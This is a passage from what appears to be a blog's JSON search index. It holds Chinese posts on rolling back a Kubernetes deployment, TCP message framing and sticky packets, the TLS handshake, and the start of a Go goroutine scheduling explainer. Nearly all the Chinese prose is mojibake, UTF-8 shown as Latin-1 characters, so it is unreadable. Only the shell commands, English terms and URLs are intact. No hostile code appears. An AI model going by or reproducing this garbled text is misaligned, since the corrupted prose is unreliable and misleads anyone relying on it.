19s\n```\n\n\n\nå‡è®¾æˆ‘ä»¬å¯¹é¡¹ç›®åšäº†ä¸€äº›æ”¹åŠ¨ï¼Œè¦å‘å¸ƒä¸€ä¸ªæ–°ç‰ˆæœ¬ã€‚è¿™é‡Œä½œä¸ºç¤ºä¾‹ï¼Œæˆ‘ä»¬åªæŠŠ HTML æ–‡ä»¶çš„å†…å®¹æ”¹ä¸€ä¸‹, ç„¶åæ„å»ºä¸€ä¸ªæ–°ç‰ˆé•œåƒ k8s-demo:0.2ï¼š\n\n```bash\necho '<h1>Hello Kubernetes22222222222!</h1>' > html/index.html\ndocker build -t k8s-demo:0.2 .\n\n# æ›¿æ¢ deployment.yml çš„ tag å€¼\n\n# é‡æ–°åº”ç”¨ deployment\nkubectl apply -f deployment.yml --record=true\n```\n\n\n\næ­¤æ—¶æˆ‘ä»¬è®¿é—®\n\n```bash\ncurl http://10.0.0.5:30050\n# Hello Kubernetes22222222222!\n```\n\n\n\nå›æ»šç‰ˆæœ¬1\n\n```Â bash\nkubectl rollout undo deployment k8s-demo-deployment --to-revision=1\n\n# å¯ä»¥æŸ¥çœ‹å›æ»šè¿›åº¦\nkubectl rollout status deployment k8s-demo-deployment\n```\n\n\n\nå†æ¬¡è®¿é—®\n\n```bash\ncurl http://10.0.0.5:30050\n# Hello Kubernetes!\n```\n\n\n\n# 3. æ€»ç»“\n\n+ å®¹å™¨å¼•æ“(ä¾‹å¦‚docker) æ”¾åœ¨ pod é‡Œé¢\n+ pod å¢åŠ äº†æ ‡ç­¾å, service å¯ä»¥ç®¡ç†\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://zhuanlan.zhihu.com/p/39937913\n","tags":["k8s"],"categories":["k8s"]},{"title":"tcpç²˜åŒ…é—®é¢˜","url":"%2Fp%2F6d39ef4c.html","content":"\n# 1. TCP ç²˜åŒ…\n\nç²˜åŒ…å¹¶ä¸æ˜¯ TCP åè®®é€ æˆçš„ï¼Œå®ƒçš„å‡ºç°æ˜¯å› ä¸ºåº”ç”¨å±‚åè®®è®¾è®¡è€…å¯¹ TCP åè®®çš„é”™è¯¯ç†è§£ï¼Œå¿½ç•¥äº† TCP åè®®çš„å®šä¹‰å¹¶ä¸”ç¼ºä¹è®¾è®¡åº”ç”¨å±‚åè®®çš„ç»éªŒã€‚æˆ‘ä»¬ç»å¸¸æåˆ°çš„ TCP åè®®ä¸­çš„ç²˜åŒ…æ˜¯å¦‚ä½•å‘ç”Ÿçš„ï¼š\n\n- TCP åè®®æ˜¯é¢å‘å­—èŠ‚æµçš„åè®®ï¼Œå®ƒå¯èƒ½ä¼šç»„åˆæˆ–è€…æ‹†åˆ†åº”ç”¨å±‚åè®®çš„æ•°æ®ï¼›\n- åº”ç”¨å±‚åè®®çš„æ²¡æœ‰å®šä¹‰æ¶ˆæ¯çš„è¾¹ç•Œå¯¼è‡´æ•°æ®çš„æ¥æ”¶æ–¹æ— æ³•æ‹¼æ¥æ•°æ®ï¼›\n\nTCPæœ¬æ¥å°±æ˜¯åŸºäºå­—èŠ‚æµè€Œä¸æ˜¯æ¶ˆæ¯åŒ…çš„åè®®ï¼Œä¼šæŠŠä½ çš„æ•°æ®å˜æˆå­—èŠ‚æµå‘åˆ°å¯¹é¢å»ï¼Œè€Œä¸”ä¿è¯é¡ºåºä¸ä¼šä¹±ï¼Œä½†æ˜¯ä½ è¦è‡ªå·±æå®šå­—èŠ‚æµè§£æã€‚\n\n<!-- more -->\n\n# 2. ç²˜åŒ…é—®é¢˜å¦‚ä½•å¤„ç†ï¼Ÿ\n\n### 2.1 Nagleç®—æ³•\n\nNagle ç®—æ³•ç¡®å®èƒ½å¤Ÿåœ¨æ•°æ®åŒ…è¾ƒå°æ—¶æé«˜ç½‘ç»œå¸¦å®½çš„åˆ©ç”¨ç‡å¹¶å‡å°‘ TCP å’Œ IP åè®®å¤´å¸¦æ¥çš„é¢å¤–å¼€é”€ï¼Œä½†æ˜¯ä½¿ç”¨è¯¥ç®—æ³•ä¹Ÿå¯èƒ½ä¼šå¯¼è‡´åº”ç”¨å±‚åè®®å¤šæ¬¡å†™å…¥çš„æ•°æ®è¢«åˆå¹¶æˆ–è€…æ‹†åˆ†å‘é€ï¼Œå½“æ¥æ”¶æ–¹ä» TCP åè®®æ ˆä¸­è¯»å–æ•°æ®æ—¶ä¼šå‘ç°ä¸ç›¸å…³çš„æ•°æ®å‡ºç°åœ¨äº†åŒä¸€ä¸ªæ•°æ®æ®µä¸­ï¼Œåº”ç”¨å±‚åè®®å¯èƒ½æ²¡æœ‰åŠæ³•å¯¹å®ƒä»¬è¿›è¡Œæ‹†åˆ†å’Œé‡ç»„ã€‚\n\nNagleç®—æ³•é—®é¢˜å¯¼è‡´çš„ï¼Œéœ€è¦ç»“åˆåº”ç”¨åœºæ™¯é€‚å½“å…³é—­è¯¥ç®—æ³•ã€‚\n\n### 2.2 æ¶ˆæ¯è¾¹ç•Œ\n\nå¦‚æœæˆ‘ä»¬èƒ½åœ¨åº”ç”¨å±‚åè®®ä¸­å®šä¹‰æ¶ˆæ¯çš„è¾¹ç•Œï¼Œé‚£ä¹ˆæ— è®º TCP åè®®å¦‚ä½•å¯¹åº”ç”¨å±‚åè®®çš„æ•°æ®åŒ…è¿›ç¨‹æ‹†åˆ†å’Œé‡ç»„ï¼Œæ¥æ”¶æ–¹éƒ½èƒ½æ ¹æ®åè®®çš„è§„åˆ™æ¢å¤å¯¹åº”çš„æ¶ˆæ¯ã€‚åœ¨åº”ç”¨å±‚åè®®ä¸­ï¼Œæœ€å¸¸è§çš„ä¸¤ç§è§£å†³æ–¹æ¡ˆå°±æ˜¯\n\n+ åŸºäºé•¿åº¦\n\n  åŸºäºé•¿åº¦çš„å®ç°æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯ä½¿ç”¨å›ºå®šé•¿åº¦ï¼Œæ‰€æœ‰çš„åº”ç”¨å±‚æ¶ˆæ¯éƒ½ä½¿ç”¨ç»Ÿä¸€çš„å¤§å°ï¼Œå¦ä¸€ç§æ–¹å¼æ˜¯ä½¿ç”¨ä¸å›ºå®šé•¿åº¦ï¼Œä½†æ˜¯éœ€è¦åœ¨åº”ç”¨å±‚åè®®çš„åè®®å¤´ä¸­å¢åŠ è¡¨ç¤ºè´Ÿè½½é•¿åº¦çš„å­—æ®µï¼Œè¿™æ ·æ¥æ”¶æ–¹æ‰å¯ä»¥ä»å­—èŠ‚æµä¸­åˆ†ç¦»å‡ºä¸åŒçš„æ¶ˆæ¯ï¼ŒHTTP åè®®çš„æ¶ˆæ¯è¾¹ç•Œå°±æ˜¯åŸºäºé•¿åº¦å®ç°çš„ã€‚\n\n  åœ¨ä¸Šè¿° HTTP æ¶ˆæ¯ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ Content-Length å¤´è¡¨ç¤º HTTP æ¶ˆæ¯çš„è´Ÿè½½å¤§å°ï¼Œå½“åº”ç”¨å±‚åè®®è§£æåˆ°è¶³å¤Ÿçš„å­—èŠ‚æ•°åï¼Œå°±èƒ½ä»ä¸­åˆ†ç¦»å‡ºå®Œæ•´çš„ HTTP æ¶ˆæ¯ï¼Œæ— è®ºå‘é€æ–¹å¦‚ä½•å¤„ç†å¯¹åº”çš„æ•°æ®åŒ…ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥éµå¾ªè¿™ä¸€è§„åˆ™å®Œæˆ HTTP æ¶ˆæ¯çš„é‡ç»„ã€‚\n\n+ åŸºäºç»ˆç»“ç¬¦ï¼ˆDelimiterï¼‰\n\n  ä¸è¿‡ HTTP åè®®é™¤äº†ä½¿ç”¨åŸºäºé•¿åº¦çš„æ–¹å¼å®ç°è¾¹ç•Œï¼Œä¹Ÿä¼šä½¿ç”¨åŸºäºç»ˆç»“ç¬¦çš„ç­–ç•¥ï¼Œå½“ HTTP ä½¿ç”¨å—ä¼ è¾“ï¼ˆChunked Transferï¼‰æœºåˆ¶æ—¶ï¼ŒHTTP å¤´ä¸­å°±ä¸å†åŒ…å« Content-Length äº†ï¼Œå®ƒä¼šä½¿ç”¨è´Ÿè½½å¤§å°ä¸º 0 çš„ HTTP æ¶ˆæ¯ä½œä¸ºç»ˆç»“ç¬¦è¡¨ç¤ºæ¶ˆæ¯çš„è¾¹ç•Œã€‚\n\n  è¿˜æœ‰ä¾‹å¦‚\\nï¼Œ\\rï¼Œ\\tï¼Œæˆ–è€…ä¸€äº›éšè—å­—ç¬¦ã€‚\n\nå½“ç„¶é™¤äº†è¿™ä¸¤ç§æ–¹å¼ä¹‹å¤–ï¼Œæˆ‘ä»¬å¯ä»¥åŸºäºç‰¹å®šçš„è§„åˆ™å®ç°æ¶ˆæ¯çš„è¾¹ç•Œï¼Œä¾‹å¦‚ï¼šä½¿ç”¨ TCP åè®®å‘é€ JSON æ•°æ®ï¼Œæ¥æ”¶æ–¹å¯ä»¥æ ¹æ®æ¥æ”¶åˆ°çš„æ•°æ®æ˜¯å¦èƒ½å¤Ÿè¢«è§£ææˆåˆæ³•çš„ JSON åˆ¤æ–­æ¶ˆæ¯æ˜¯å¦ç»ˆç»“ã€‚\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://www.zhihu.com/question/20210025\n\n+ https://draveness.me/whys-the-design-tcp-message-frame/","tags":["tcp"],"categories":["ç½‘ç»œ"]},{"title":"tlsäº¤äº’å››æ¬¡æ¡æ‰‹","url":"%2Fp%2F45348d89.html","content":"\n\n\n# 1. tlsäº¤äº’å››æ¬¡æ¡æ‰‹\n\nTLS æ¡æ‰‹çš„å…³é”®åœ¨äºåˆ©ç”¨é€šä¿¡åŒæ–¹ç”Ÿæˆçš„éšæœºå­—ç¬¦ä¸²å’ŒæœåŠ¡ç«¯çš„å…¬é’¥ç”Ÿæˆä¸€ä¸ªåŒæ–¹ç»è¿‡åå•†åçš„å¯†é’¥ï¼Œé€šä¿¡çš„åŒæ–¹å¯ä»¥ä½¿ç”¨è¿™ä¸ªå¯¹ç§°çš„å¯†é’¥åŠ å¯†æ¶ˆæ¯é˜²æ­¢ä¸­é—´äººçš„ç›‘å¬å’Œæ”»å‡»ï¼Œä¿è¯é€šä¿¡çš„å®‰å…¨ã€‚åç»­é€šè¿‡å¯¹ç§°å¯†é’¥ä¼ é€’ä¿¡æ¯ã€‚\n\n<!-- more -->\n\nâ‘   å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€ Client Hello æ¶ˆæ¯\n\n+ åè®®ç‰ˆæœ¬ï¼ˆ egï¼šTLS 1.0ï¼‰\n\n+ åŠ å¯†ç®—æ³•ï¼ˆegï¼šRSAï¼‰\n\n+ å‹ç¼©ç®—æ³•\n\n+ å®¢æˆ·ç«¯ç”Ÿæˆçš„éšæœºæ•°(ç¨åç”¨äºç”Ÿæˆå¯¹è¯å¯†é’¥)\n\n\n\nâ‘¡ æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯å‘é€ Server Hello æ¶ˆæ¯\n\n+ åè®®ç‰ˆæœ¬ï¼ŒåŠ å¯†ç®—æ³•ç¡®è®¤\n+ ä¼šè¯ ID\n+ æœåŠ¡å™¨æ•°å­—è¯ä¹¦\n+ æœåŠ¡å™¨å…¬é’¥\n+ æœåŠ¡ç«¯ç”Ÿæˆçš„éšæœºæ•°(ç¨åç”¨äºç”Ÿæˆå¯¹è¯å¯†é’¥)\n\n\n\nâ‘¢ å®¢æˆ·ç«¯éªŒè¯ æœåŠ¡å™¨è¯ä¹¦ å’Œ åå•†å¯†é’¥\n\n+ è¿æ¥æœåŠ¡å™¨çš„ CA éªŒè¯æœåŠ¡ç«¯çš„è¯ä¹¦\n+ å‘æœåŠ¡ç«¯å‘é€ Client Key Exchange , ç”¨æœåŠ¡å™¨å…¬é’¥åŠ å¯†ã€‚\n+ å‘æœåŠ¡ç«¯å‘é€ Finished æ¶ˆæ¯ï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯çš„æ¡æ‰‹é˜¶æ®µå·²ç»ç»“æŸã€‚è¿™ä¸€é¡¹åŒæ—¶ä¹Ÿæ˜¯å‰é¢å‘é€çš„æ‰€æœ‰å†…å®¹çš„hashå€¼ï¼Œç”¨æ¥ä¾›æœåŠ¡å™¨æ ¡éªŒã€‚\n\n\n\nâ‘£ å‘å®¢æˆ·ç«¯å‘é€ Finished æ¶ˆæ¯\n\n+ è®¡ç®—ç”Ÿæˆæœ¬æ¬¡ä¼šè¯æ‰€ç”¨çš„ä¼šè¯å¯†é’¥\n+ å‘å®¢æˆ·ç«¯å‘é€ Client Key Exchange, è¡¨ç¤ºéšåçš„ä¿¡æ¯éƒ½å°†ç”¨åŒæ–¹å•†å®šçš„åŠ å¯†æ–¹æ³•å’Œå¯†é’¥å‘é€ã€‚\n+ å‘å®¢æˆ·ç«¯å‘é€ Finished æ¶ˆæ¯ï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯çš„æ¡æ‰‹é˜¶æ®µå·²ç»ç»“æŸã€‚è¿™ä¸€é¡¹åŒæ—¶ä¹Ÿæ˜¯å‰é¢å‘é€çš„æ‰€æœ‰å†…å®¹çš„hashå€¼ï¼Œç”¨æ¥ä¾›å®¢æˆ·ç«¯æ ¡éªŒã€‚\n\n\n\n# 2. å½¢è±¡åŒ–æ¯”å–»\n\næˆ‘ä»¬å‡è®¾Aä¸Bé€šä¿¡ï¼ŒAæ˜¯SSLå®¢æˆ·ç«¯ï¼ŒBæ˜¯SSLæœåŠ¡å™¨ç«¯ã€‚\n\nåŠ å¯†åçš„æ¶ˆæ¯æ”¾åœ¨æ–¹æ‹¬å·[]é‡Œï¼Œä»¥çªå‡ºæ˜æ–‡æ¶ˆæ¯çš„åŒºåˆ«ã€‚åŒæ–¹çš„å¤„ç†åŠ¨ä½œçš„è¯´æ˜ç”¨åœ†æ‹¬å·ï¼ˆï¼‰æ‹¬èµ·ã€‚\n\n\n\nâ‘ Aï¼šæˆ‘æƒ³å’Œä½ å®‰å…¨çš„é€šè¯ï¼Œæˆ‘è¿™é‡Œçš„å¯¹ç§°åŠ å¯†ç®—æ³•æœ‰DES,RC5,å¯†é’¥äº¤æ¢ç®—æ³•æœ‰RSAå’ŒDHï¼Œæ‘˜è¦ç®—æ³•æœ‰MD5å’ŒSHAã€‚\n\nâ‘¡Bï¼šæˆ‘ä»¬ç”¨DESï¼RSAï¼SHAè¿™å¯¹ç»„åˆå¥½äº†ã€‚è¿™æ˜¯æˆ‘çš„è¯ä¹¦ï¼Œé‡Œé¢æœ‰æˆ‘çš„åå­—å’Œå…¬é’¥ï¼Œä½ æ‹¿å»éªŒè¯ä¸€ä¸‹æˆ‘çš„èº«ä»½ã€‚\n\nâ‘¢Aï¼šï¼ˆé€šè¿‡CAçš„è¯ä¹¦éªŒè¯äº†Bçš„è¯ä¹¦çš„çœŸå®æ€§ï¼Œå¦‚æœå…¶ä¸­ä¸€é¡¹æœ‰è¯¯ï¼Œå‘å‡ºè­¦å‘Šå¹¶æ–­å¼€è¿æ¥ï¼Œè¿™ä¸€æ­¥ä¿è¯äº†Bçš„å…¬é’¥çš„çœŸå®æ€§ï¼‰\n\næˆ‘ç”Ÿæˆäº†ä¸€ä»½ç§˜å¯†æ¶ˆæ¯ï¼Œå¹¶ç”¨ä½ çš„å…¬é’¥åŠ å¯†äº†ï¼Œç»™ä½ ï¼ˆæŠŠClientKeyExchangeå‘ç»™Bï¼‰æ³¨æ„ï¼Œä¸‹é¢æˆ‘å°±è¦ç”¨åŠ å¯†çš„åŠæ³•ç»™ä½ å‘æ¶ˆæ¯äº†ï¼\n\n[æˆ‘è¯´å®Œäº†]\n\nâ‘£Bï¼šï¼ˆç”¨è‡ªå·±çš„ç§é’¥å°†ClientKeyExchangeä¸­çš„ç§˜å¯†æ¶ˆæ¯è§£å¯†å‡ºæ¥ï¼Œç„¶åå°†ç§˜å¯†æ¶ˆæ¯è¿›è¡Œå¤„ç†ï¼Œç”ŸæˆåŠ å¯†å¯†é’¥ï¼‰\n\næ³¨æ„ï¼Œæˆ‘ä¹Ÿè¦å¼€å§‹ç”¨åŠ å¯†çš„åŠæ³•ç»™ä½ å‘æ¶ˆæ¯äº†ï¼\n\n[æˆ‘è¯´å®Œäº†]\n\n---\n\nA: [æˆ‘çš„ç§˜å¯†æ˜¯...]\n\nB: [å…¶å®ƒäººä¸ä¼šå¬åˆ°çš„...]\n\n\n\n# 3. é—®é¢˜æ€»ç»“\n\n### 3.1 è¯ä¹¦çš„æ•°å­—ç­¾åï¼ˆDigital Signatureï¼‰\n\nä½¿ç”¨æ•£åˆ—å’Œéå¯¹ç§°åŠ å¯†éªŒè¯æ–‡æ¡£çš„çœŸå®æ€§ã€‚å…ˆä¸ºè¦ç­¾åçš„ä¿¡æ¯ç”Ÿæˆä¸€ä¸ªHashå­—ä¸²ï¼ŒHash1ï¼Œç„¶åç”¨ä½ çš„ç§é’¥åŠ å¯†å¾—åˆ°Encrypted(Hash1)ï¼Œè¿™å°±æ˜¯ä½ å¯¹è¿™ä¸ªæ–‡æ¡£çš„æ•°å­—ç­¾åã€‚\n\nå½“åˆ«äººéœ€è¦éªŒè¯æŸä¸ªæ–‡æ¡£æ˜¯å¦æ˜¯ä½ ç­¾åçš„æ—¶å€™ï¼Œåªéœ€è¦ç”¨ä½ çš„å…¬é’¥è§£å¯†ä½ çš„ç­¾åå¾—åˆ°Hash1ï¼Œå¹¶å’Œè¯¥æ–‡æ¡£è®¡ç®—å‡ºæ¥çš„Hash2å¯¹æ¯”ï¼ŒæŸ¥çœ‹æ˜¯å¦ä¸€è‡´ã€‚å¦‚æœä¸€è‡´åˆ™è¯´æ˜ä½ ç¡®å®å¯¹è¯¥æ–‡æ¡£ç­¾è¿‡åï¼Œå¦åˆ™å°±æ˜¯æ²¡æœ‰ã€‚\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://www.ruanyifeng.com/blog/2014/02/ssl_tls.html\n\n+ https://draveness.me/whys-the-design-https-latency/","tags":["http"],"categories":["Web"]},{"title":"golangåç¨‹è°ƒåº¦","url":"%2Fp%2Fc8d0853c.html","content":"\n\n\n# 1. åŸºç¡€æœ¯è¯­\n\n### 1.1 å¹¶å‘\n\nä¸€ä¸ªcpuä¸Šèƒ½åŒæ—¶æ‰§è¡Œå¤šé¡¹ä»»åŠ¡ï¼Œåœ¨å¾ˆçŸ­æ—¶é—´å†…ï¼Œcpuæ¥å›åˆ‡æ¢ä»»åŠ¡æ‰§è¡Œ(åœ¨æŸæ®µå¾ˆçŸ­æ—¶é—´å†…æ‰§è¡Œç¨‹åºaï¼Œç„¶ååˆè¿…é€Ÿå¾—åˆ‡æ¢åˆ°ç¨‹åºbå»æ‰§è¡Œ)ï¼Œæœ‰æ—¶é—´ä¸Šçš„é‡å ï¼ˆå®è§‚ä¸Šæ˜¯åŒæ—¶çš„ï¼Œå¾®è§‚ä»æ˜¯é¡ºåºæ‰§è¡Œï¼‰,è¿™æ ·çœ‹èµ·æ¥å¤šä¸ªä»»åŠ¡åƒæ˜¯åŒæ—¶æ‰§è¡Œï¼Œè¿™å°±æ˜¯å¹¶å‘ã€‚\n\n<!-- more -->\n\n### 1.2 å¹¶è¡Œ\n\nå½“ç³»ç»Ÿæœ‰å¤šä¸ªCPUæ—¶,æ¯ä¸ªCPUåŒä¸€æ—¶åˆ»éƒ½è¿è¡Œä»»åŠ¡ï¼Œäº’ä¸æŠ¢å è‡ªå·±æ‰€åœ¨çš„CPUèµ„æºï¼ŒåŒæ—¶è¿›è¡Œï¼Œç§°ä¸ºå¹¶è¡Œã€‚\n\n### 1.3 è¿›ç¨‹\n\ncpuåœ¨åˆ‡æ¢ç¨‹åºçš„æ—¶å€™ï¼Œå¦‚æœä¸ä¿å­˜ä¸Šä¸€ä¸ªç¨‹åºçš„çŠ¶æ€ï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„context--ä¸Šä¸‹æ–‡ï¼‰ï¼Œç›´æ¥åˆ‡æ¢ä¸‹ä¸€ä¸ªç¨‹åºï¼Œå°±ä¼šä¸¢å¤±ä¸Šä¸€ä¸ªç¨‹åºçš„ä¸€ç³»åˆ—çŠ¶æ€ï¼Œäºæ˜¯å¼•å…¥äº†è¿›ç¨‹è¿™ä¸ªæ¦‚å¿µï¼Œç”¨ä»¥åˆ’åˆ†å¥½ç¨‹åºè¿è¡Œæ—¶æ‰€éœ€è¦çš„èµ„æºã€‚å› æ­¤è¿›ç¨‹å°±æ˜¯ä¸€ä¸ªç¨‹åºè¿è¡Œæ—¶å€™çš„æ‰€éœ€è¦çš„åŸºæœ¬èµ„æºå•ä½ï¼ˆä¹Ÿå¯ä»¥è¯´æ˜¯ç¨‹åºè¿è¡Œçš„ä¸€ä¸ªå®ä½“ï¼‰ã€‚\n\n### 1.4 çº¿ç¨‹\n\ncpuåˆ‡æ¢å¤šä¸ªè¿›ç¨‹çš„æ—¶å€™ï¼Œä¼šèŠ±è´¹ä¸å°‘çš„æ—¶é—´ï¼Œå› ä¸ºåˆ‡æ¢è¿›ç¨‹éœ€è¦åˆ‡æ¢åˆ°å†…æ ¸æ€ï¼Œè€Œæ¯æ¬¡è°ƒåº¦éœ€è¦å†…æ ¸æ€éƒ½éœ€è¦è¯»å–ç”¨æˆ·æ€çš„æ•°æ®ï¼Œè¿›ç¨‹ä¸€æ—¦å¤šèµ·æ¥ï¼Œcpuè°ƒåº¦ä¼šæ¶ˆè€—ä¸€å¤§å †èµ„æºï¼Œå› æ­¤å¼•å…¥äº†çº¿ç¨‹çš„æ¦‚å¿µï¼Œçº¿ç¨‹æœ¬èº«å‡ ä¹ä¸å æœ‰èµ„æºï¼Œä»–ä»¬å…±äº«è¿›ç¨‹é‡Œçš„èµ„æºï¼Œå†…æ ¸è°ƒåº¦èµ·æ¥ä¸ä¼šé‚£ä¹ˆåƒè¿›ç¨‹åˆ‡æ¢é‚£ä¹ˆè€—è´¹èµ„æºã€‚\n\n### 1.5 åç¨‹\n\nåç¨‹æ‹¥æœ‰è‡ªå·±çš„å¯„å­˜å™¨ä¸Šä¸‹æ–‡å’Œæ ˆã€‚åç¨‹è°ƒåº¦åˆ‡æ¢æ—¶ï¼Œå°†å¯„å­˜å™¨ä¸Šä¸‹æ–‡å’Œæ ˆä¿å­˜åˆ°å…¶ä»–åœ°æ–¹ï¼Œåœ¨åˆ‡å›æ¥çš„æ—¶å€™ï¼Œæ¢å¤å…ˆå‰ä¿å­˜çš„å¯„å­˜å™¨ä¸Šä¸‹æ–‡å’Œæ ˆã€‚å› æ­¤ï¼Œåç¨‹èƒ½ä¿ç•™ä¸Šä¸€æ¬¡è°ƒç”¨æ—¶çš„çŠ¶æ€ï¼ˆå³æ‰€æœ‰å±€éƒ¨çŠ¶æ€çš„ä¸€ä¸ªç‰¹å®šç»„åˆï¼‰ï¼Œæ¯æ¬¡è¿‡ç¨‹é‡å…¥æ—¶ï¼Œå°±ç›¸å½“äºè¿›å…¥ä¸Šä¸€æ¬¡è°ƒç”¨çš„çŠ¶æ€ï¼Œæ¢ç§è¯´æ³•ï¼šè¿›å…¥ä¸Šä¸€æ¬¡ç¦»å¼€æ—¶æ‰€å¤„é€»è¾‘æµçš„ä½ç½®ã€‚çº¿ç¨‹å’Œè¿›ç¨‹çš„æ“ä½œæ˜¯ç”±ç¨‹åºè§¦å‘ç³»ç»Ÿæ¥å£ï¼Œæœ€åçš„æ‰§è¡Œè€…æ˜¯ç³»ç»Ÿï¼›åç¨‹çš„æ“ä½œæ‰§è¡Œè€…åˆ™æ˜¯ç”¨æˆ·è‡ªèº«ç¨‹åºï¼Œgoroutineä¹Ÿæ˜¯åç¨‹ã€‚\n\n\n\n# 2. golang è°ƒåº¦æ¨¡å‹\n\n### 2.1 è°ƒåº¦å™¨çš„ä¸‰ä¸ªåŸºæœ¬å¯¹è±¡\n\n![1](golangåç¨‹è°ƒåº¦/4.png)\n\n- M (Work Thread)ï¼ŒMä»£è¡¨å†…æ ¸çº§çº¿ç¨‹ï¼Œä¸€ä¸ªMå°±æ˜¯ä¸€ä¸ªçº¿ç¨‹ï¼Œgoroutineå°±æ˜¯è·‘åœ¨Mä¹‹ä¸Šçš„ï¼›Mæ˜¯ä¸€ä¸ªå¾ˆå¤§çš„ç»“æ„ï¼Œé‡Œé¢ç»´æŠ¤å°å¯¹è±¡å†…å­˜cacheï¼ˆmcacheï¼‰ã€å½“å‰æ‰§è¡Œçš„goroutineã€éšæœºæ•°å‘ç”Ÿå™¨ç­‰ç­‰éå¸¸å¤šçš„ä¿¡æ¯\n- G (Goroutine)ï¼Œä»£è¡¨ä¸€ä¸ªgoroutineï¼Œå®ƒæœ‰è‡ªå·±çš„æ ˆï¼Œinstruction pointerå’Œå…¶ä»–ä¿¡æ¯ï¼ˆæ­£åœ¨ç­‰å¾…çš„channelç­‰ç­‰ï¼‰ï¼Œç”¨äºè°ƒåº¦ã€‚\n- P (Processor)ï¼Œå¤„ç†å™¨ï¼Œå®ƒçš„ä¸»è¦ç”¨é€”å°±æ˜¯ç”¨æ¥æ‰§è¡Œgoroutineçš„ï¼Œæ‰€ä»¥å®ƒä¹Ÿç»´æŠ¤äº†ä¸€ä¸ªgoroutineé˜Ÿåˆ—ï¼Œé‡Œé¢å­˜å‚¨äº†æ‰€æœ‰éœ€è¦å®ƒæ¥æ‰§è¡Œçš„goroutine   \n\n\n\n### 2.2 è°ƒåº¦å®ç°\n\n![1](golangåç¨‹è°ƒåº¦/1.png)\n\nä»ä¸Šå›¾ä¸­çœ‹ï¼Œæœ‰2ä¸ªç‰©ç†çº¿ç¨‹Mï¼Œæ¯ä¸€ä¸ªMéƒ½æ‹¥æœ‰ä¸€ä¸ªå¤„ç†å™¨Pï¼Œæ¯ä¸€ä¸ªä¹Ÿéƒ½æœ‰ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„goroutineã€‚\n\n+ Pçš„æ•°é‡å¯ä»¥é€šè¿‡GOMAXPROCS() æ¥è®¾ç½®ï¼Œå®ƒå…¶å®ä¹Ÿå°±ä»£è¡¨äº†çœŸæ­£çš„å¹¶å‘åº¦ï¼Œå³æœ‰å¤šå°‘ä¸ªgoroutineå¯ä»¥åŒæ—¶è¿è¡Œã€‚\n+ å›¾ä¸­ç°è‰²çš„é‚£äº›goroutineå¹¶æ²¡æœ‰è¿è¡Œï¼Œè€Œæ˜¯å‡ºäºreadyçš„å°±ç»ªæ€ï¼Œæ­£åœ¨ç­‰å¾…è¢«è°ƒåº¦ã€‚Pç»´æŠ¤ç€è¿™ä¸ªé˜Ÿåˆ—ï¼ˆç§°ä¹‹ä¸ºrunqueueï¼‰\n+ Goè¯­è¨€é‡Œï¼Œå¯åŠ¨ä¸€ä¸ªgoroutineå¾ˆå®¹æ˜“ï¼šgo function å°±è¡Œï¼Œæ‰€ä»¥æ¯æœ‰ä¸€ä¸ªgoè¯­å¥è¢«æ‰§è¡Œï¼Œrunqueueé˜Ÿåˆ—å°±åœ¨å…¶æœ«å°¾åŠ å…¥ä¸€ä¸ª\n\n### 2.3 çº¿ç¨‹é˜»å¡\n\nå½“ä¸€ä¸ªOSçº¿ç¨‹M0é™·å…¥é˜»å¡æ—¶ï¼ˆå¦‚ä¸‹å›¾)ï¼Œ ä¾‹å¦‚åç¨‹G0é‡åˆ°é˜»å¡è°ƒç”¨ï¼ˆæ¯”å¦‚ç³»ç»Ÿè°ƒç”¨syscallï¼‰è¶…è¿‡10msæ—¶ ï¼Œè¿™ä¸ªG0è¿åŒM0 ä¼šè¢«å‰¥ç¦»å‡ºPï¼Œäº§ç”Ÿä¸€ä¸ªæ–°çš„M1 æ¥æ¥æ‰‹P(æˆ–è€…ä»çº¿ç¨‹ç¼“å­˜ä¸­å–å‡º)\n\n![1](golangåç¨‹è°ƒåº¦/2.png)\n\n\n\nå½“MOè¿”å›æ—¶ï¼Œå®ƒå¿…é¡»å°è¯•å–å¾—ä¸€ä¸ªPæ¥è¿è¡Œgoroutineï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå®ƒä¼šä»å…¶ä»–çš„OSçº¿ç¨‹é‚£é‡Œæ‹¿ä¸€ä¸ªPè¿‡æ¥ï¼Œå¦‚æœæ²¡æœ‰æ‹¿åˆ°çš„è¯ï¼Œå®ƒå°±æŠŠgoroutineæ”¾åœ¨ä¸€ä¸ªglobal runqueueé‡Œï¼Œç„¶åè‡ªå·±ç¡çœ ï¼ˆæ”¾å…¥çº¿ç¨‹ç¼“å­˜é‡Œï¼‰ã€‚\n\næ‰€æœ‰çš„Pä¹Ÿä¼šå‘¨æœŸæ€§çš„æ£€æŸ¥global runqueueå¹¶è¿è¡Œå…¶ä¸­çš„goroutineï¼Œå¦åˆ™global runqueueä¸Šçš„goroutineæ°¸è¿œæ— æ³•æ‰§è¡Œã€‚ \n\n### 2.4 å·¥ä½œé‡çªƒå–\n\nPæ‰€åˆ†é…çš„ä»»åŠ¡Gå¾ˆå¿«å°±æ‰§è¡Œå®Œäº†ï¼ˆåˆ†é…ä¸å‡ï¼‰ï¼Œè¿™å°±å¯¼è‡´äº†è¿™ä¸ªå¤„ç†å™¨På¾ˆå¿™ï¼Œä½†æ˜¯å…¶ä»–çš„Pè¿˜æœ‰ä»»åŠ¡ï¼Œæ­¤æ—¶å¦‚æœglobal 